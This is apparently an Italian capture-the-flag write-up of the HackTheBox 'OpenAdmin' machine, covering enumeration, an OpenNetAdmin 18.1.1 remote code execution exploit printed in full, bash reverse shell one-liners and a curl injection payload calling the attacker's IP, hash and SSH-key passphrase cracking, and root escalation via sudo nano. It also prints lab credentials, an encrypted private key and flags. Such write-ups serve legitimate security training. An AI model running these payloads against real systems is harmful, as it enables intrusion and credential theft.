**TRAGET: 10.10.10.171

# INFORMATION GATHERING

Per prima cosa lanciamo un veloce scan con [Nmap](Note/Tool/Nmap.md) per vedere quali porte sono aperte 
e con quali servizi

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# nmap -sC -sT -sV 10.10.10.171
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-29 08:34 EDT
Nmap scan report for 10.10.10.171
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds
```

un ulteriore scan su tutte le porte non ci da nessuna nuova porta aperta

Quindi ricapitolando abbiamo solo due porte aperte 

- 22 ssh ( le versioni di openssh vulnerabili sono le pià vecchie, quindi qui avremmo bisogno di credenziali che per il momento non abbiamo )
- 80 http (é la pagina di default di Apache2 )

Partiamo dalla porta 80
# ENUMERATION

Visitando il sito web otteniamo la pagina di default di apache2

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/openadmin.png)Quindi passiamo ad una prima enumerazione di eventuali directory esposte con gobuster

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u 10.10.10.171
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.171
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/29 08:44:18 Starting gobuster in directory enumeration mode
===============================================================
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/]
===============================================================
2023/09/29 08:50:18 Finished
===============================================================
```

Abbiamo 3 directory :

- /music                
- /artwork              
- /sierra 

Visitiamo `/music`

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/openadmin1.png)
E' un sito dove si puo ascoltare musica, il link al `login` ci rimanda ad una pagina `/ona` dove ci sono diverse informazioni interessanti 

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/openadmin2.png)
Possiamo vedere una versione `18.1.1`  e un DNS Domain `openadmin.htb` (aggiungiamolo al nostro `etc/hosts`)

Facendo una rapida ricerca su google troviamo subito questa [RCE](https://github.com/amriunix/ona-rce)

# GAINING AN INITIAL FOOTHOLD

## ona-rce.py 

La scarichiamo ed adiamo a vederla 

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# git clone https://github.com/amriunix/ona-rce.git
Cloning into 'ona-rce'...
remote: Enumerating objects: 11, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 11 (delta 4), reused 9 (delta 2), pack-reused 0
Receiving objects: 100% (11/11), 552.45 KiB | 3.14 MiB/s, done.
Resolving deltas: 100% (4/4), done.

┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# ls
ona-rce

┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# cd ona-rce

┌──(root㉿kali)-[/home/kali/htb/openadmin/ona-rce]
└─# ls
ona-proof.png  ona-rce.py  README.md

┌──(root㉿kali)-[/home/kali/htb/openadmin/ona-rce]
└─# chmod +x ona-rce.py

┌──(root㉿kali)-[/home/kali/htb/openadmin/ona-rce]
└─# python3 ona-rce.py
[*] OpenNetAdmin 18.1.1 - Remote Code Execution

[-] Usage: python3 ona-rce.py [check | exploit] <URL>

[*] Options:
        [+] check    : Verify if the target is vulnerable
        [+] exploit  : Exploiting the target

```

Andiamo a settare l'exploit 

```
┌──(root㉿kali)-[/home/kali/htb/openadmin/ona-rce]
└─# python3 ona-rce.py exploit http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
id
[+] Connected Successfully!
sh$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh$
```

>[!info] la shell sembra bugguata, non mi fa cambiare la directory ne altro proviamo ad aggirare il problema

ci mettiamo in ascolto con nc

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# nc -lvp 443
listening on [any] 443 ...

```

e dalla shell di prima gli diamo `/bin/bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'`

```
┌──(root㉿kali)-[/home/kali/htb/openadmin/ona-rce]
└─# python3 ona-rce.py exploit http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
id
[+] Connected Successfully!
sh$ uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh$/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'

```

e abbiamo la nostra shell stabile 

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.10.14.16] from openadmin.htb [10.10.10.171] 42352
bash: cannot set terminal process group (1265): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@openadmin:/opt/ona/www$
```

facciamo il solito update

```bash
SHELL=/bin/bash script -q /dev/null


^Z
stty raw -echo; fg
export SHELL=bash
export TERM=xterm-256color
```

e siamo pronti per continuare l'enumerazione.

## Alternative foothold

Cercando con [Searchsploit](Note/Tool/Searchsploit.md) troviamo questa RCE

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# searchsploit OpenNetAdmin
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)| php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution| php/webapps/47691.sh
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Scarichiamo e guariamolo 

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# cat 47691.sh
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done

```

Lo script esegue un ciclo bash infinito prendendo comandi e stampando l'output:

Dato che voglio una shell legittima, userò curl per eseguire il push di una shell inversa bash, prima ci mettiamo sempre in ascolto con nc 

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 999
listening on [any] 999 ...
```

usiamo curl per eseguire il push dell shell

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.14.16/999 0>%261'&xajaxargs[]=ping"  http://10.10.10.171/ona/
```

e abbiamo la nostra shell

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 999
listening on [any] 999 ...
connect to [10.10.14.16] from openadmin.htb [10.10.10.171] 46252
bash: cannot set terminal process group (1265): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@openadmin:/opt/ona/www$
```

# PRIVESC

## www-data -> jimmy

Nella home abbiamo due utenti `jimmy` e `joanna`

```bash
www-data@openadmin:/opt/ona/www/$ cd /home
www-data@openadmin:/home$ ls
jimmy  joanna
```

Proviamo ad accedere 

```
www-data@openadmin:/home$ cd jimmy
bash: cd: jimmy: Permission denied
www-data@openadmin:/home$ cd joanna
bash: cd: joanna: Permission denied
www-data@openadmin:/home$
```

Riceviamo un `Permission denied` in quanto siamo utenti www-data, dobbiamo procedere con l'enumerazione.

Nella directory `local/config`  troviamo quello che sembra un file di configurazione di un database, con relativa password

```bash
www-data@openadmin:/opt/ona/www$ ls -l
total 60
drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 config
-rw-rw-r-- 1 www-data www-data 1949 Jan  3  2018 config_dnld.php
-rw-rw-r-- 1 www-data www-data 4160 Jan  3  2018 dcm.php
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 images
drwxrwxr-x 9 www-data www-data 4096 Jan  3  2018 include
-rw-rw-r-- 1 www-data www-data 1999 Jan  3  2018 index.php
drwxrwxr-x 5 www-data www-data 4096 Jan  3  2018 local
-rw-rw-r-- 1 www-data www-data 4526 Jan  3  2018 login.php
-rw-rw-r-- 1 www-data www-data 1106 Jan  3  2018 logout.php
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 modules
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 plugins
drwxrwxr-x 2 www-data www-data 4096 Jan  3  2018 winc
drwxrwxr-x 3 www-data www-data 4096 Jan  3  2018 workspace_plugins
www-data@openadmin:/opt/ona/www$ cd local/
www-data@openadmin:/opt/ona/www/local$ ls
config  nmap_scans  plugins
www-data@openadmin:/opt/ona/www/local$ cd config/
www-data@openadmin:/opt/ona/www/local/config$ ls
database_settings.inc.php  motd.txt.example  run_installer
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>www-data@openadmin:/opt/ona/www/local/config$
```

Una delle prime cose da fare quando si trova una password è quella di provarle con tutti gli utenti che conosciamo perché è spesso cattiva abitudine il riutilizzo di una stessa password.

```bash
www-data@openadmin:/opt/ona/www/local/config$ su jimmy
Password:
jimmy@openadmin:/opt/ona/www/local/config$
```

infatti si è rivelata essere la password dell'utente jimmy.

La directory di jimmy risulta vuota, la nostra user.flag non è qui. 
```bash
jimmy@openadmin:/opt/ona/www/local/config$ls 

```

Andiamo avanti ad enumerare.

## jimmy -> joanna

### 1st Metod

Nell directory `etc/apache2/sistes-enabled` abbiamo il file `internal.conf`
che ci da indicazione di un server interno in ascolto sulla porta 52846

```bash
jimmy@openadmin:/etc/apache2/sites-enabled$ cat internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

troviamo anche un altra informazione interessante, ci dice che altri documenti sono prendi nel percorso `var/www/internal` ci reciamo e troviamo 3 file

- index.php
- logout.php
- main.php

Diamo un occhio a `index.php`

```bash
jimmy@openadmin:/var/www/internal$ cat index.php
..<snip>..

     <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

..<snip>..
```

sembra essere un hash di una password per accedere al vhost interno in ascolto sulla porta 52846, infatti [hash.com](https://hashes.com/en/tools/hash_identifier)lo indentifica come un possibile SHA512

possiamo darlo in pasto a [John The Ripple](Note/Tool/John%20The%20Ripple.md)  come vediamo qui sotto 

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# john hash --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt --rules=jumbo
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA512 [SHA512 256/256 AVX2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Revealed         (?)
1g 0:00:00:02 DONE (2023-09-30 14:51) 0.4048g/s 6258Kp/s 6258Kc/s 6258KC/s Rey428..Reesenme
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

o a  [carcksation.net](https://crackstation.net) che forzerà l'hash come da immagine

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/openadmin3.png)
bene abbiamo la nostra password
jimmy:Revealed

Proviamo come prima ad eseguire il comando `su` joanna ma la password non è quella

Ora tornado al file `/etc/apache2/sites-enabled/internal.conf` si faceva riferimento ad un VirtualHost 127.0.0.1:52846

l'idea è quella di creare un [Tunnel ](Note/Pivoting,%20Tunneling%20and%20Port%20Forwarding.md)ssh con le cedenzili di jimmy per raggiungere il sito interno  provando la combinazione jimmy:Reveled per accedere al Virtual host e proseguire con l'enumerazione.

Procediamo..

```bash
┌──(root㉿kali)-[/home/kali]
└─# ssh jimmy@10.10.10.171 -L 52846:localhost:52846
jimmy@10.10.10.171's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep 30 19:21:45 UTC 2023

  System load:  0.0               Processes:             172
  Usage of /:   30.8% of 7.81GB   Users logged in:       0
  Memory usage: 9%                IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Sep 30 19:20:12 2023 from 10.10.14.16
jimmy@openadmin:~$
```

ed eccoci al sito interno,

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/openadmin4.png)
Mettiamo le credenziali, e siamo dentro.

![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/openadmin5.png)

ci troviamo nella pagina `main.php` e a quella che sembra una chiava privata RSA. 

Dopo averla salvata e avergli dato i permessi di lettura e scrittura con `chmod 600` proviamo a collegarci in ssh utilizzando l'id_rsa appena trovato. 

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# chmod 600 id_rsa_enc

┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# ssh -i id_rsa joanna@10.10.10.171
Enter passphrase for key 'id_rsa':

```

ci richiede una passphrase...
per provare a romperla prima di darla in pasto a [John The Ripple](Note/Tool/John%20The%20Ripple.md) dobbiamo convertila attraverso il tool [ssh2john](ssh2john.md) per estrare l'hash contenuto nella id_rsa 

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# ssh2john id_rsa_enc > id_rsa_hash
```

solo ora utilizziamo [John The Ripple](Note/Tool/John%20The%20Ripple.md)

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# john id_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
1g 0:00:00:03 DONE (2023-09-30 15:49) 0.3021g/s 2892Kp/s 2892Kc/s 2892KC/s bloodofyouth..bloodmore23
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

abbiamo la nostra passphrase

utilizziamo [Openssl](Openssl.md) per convertire la chiave id_rsa_enc in un chiave id_rsa_decrypt utilizzando la passphrase `bloodninjas`

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# openssl rsa -in id_rsa_enc -out id_rsa_decrypt
Enter pass phrase for id_rsa_enc:
writing RSA key
```

e finalmente ci possiamo collegare in ssh come utente `joanna` e prenderci la nostra user flag

```bash
┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# openssl rsa -in id_rsa_enc -out id_rsa_decrypt
Enter pass phrase for id_rsa_enc:
writing RSA key

┌──(root㉿kali)-[/home/kali/htb/openadmin]
└─# ssh -i id_rsa_decrypt joanna@10.10.10.171
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep 30 20:04:19 UTC 2023

  System load:  0.08              Processes:             172
  Usage of /:   30.9% of 7.81GB   Users logged in:       1
  Memory usage: 9%                IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ls
user.txt
joanna@openadmin:~$ cat user.txt
0a990b339b6e2c3761325a1085d0117f
joanna@openadmin:~$
```

### 2st Metod

analizzando il contenuto di `var/www/internal/` abbiamo un file di nome `main.php`
se lo leggiamo si fa riferimento ad un chiave id_rsa

```bash
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

proviamo a leggere direttamente con `curl`

```bash
jimmy@openadmin:/var/www/internal$ curl localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

una volta ottenuta la nostra id_rsa non resta che seguire i punti visti in precedenza per ottenere un accesso ssh come utente joanna.
## joanna -> root

Una delle prime cose da vedere e provare a vedere  è se possiamo eseguire qualcosa con i privilegi di root e per farlo utilizziamo il comando `suodo -l`

```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Vediamo che possiamo eseguire il binario `nano` con i privilegi di root, 
questo ci porta a quello che è definito come binary exploitation

Utilizziamo [GTFBINS](https://gtfobins.github.io) inserendo il nome del binario , in questo caso nano
e ci fornisce le istruzioni per exploitarlo.

```## Sudo[](https://gtfobins.github.io/gtfobins/nano/#sudo)

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

- ```
    sudo nano
    ^R^X
    reset; sh 1>&0 2>&0
    ```
```

Seguiamo le istrzuioni, 

```bash
joanna@openadmin:~$ sudo /bin/nano /opt/priv
```

ci ritroviamo dentro nano

digitando `^R` e poi `^X`  ci nano ci da un prompt dove possiamo eseguire dei comandi 
e scriviamo quello che che dice GTFBINS `reset; sh 1>&0 2>&0`
![](Hackthebox-OSCP-Prepartion/zzz_rev/attachments/openadmin6.png)
diamo invio ed un clear ed abbiamo un la nostra shell con i privilegi da root.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
7a73d9b4eb6b376a6d60ca597c697d6a
#
```

Openadmin Pwd!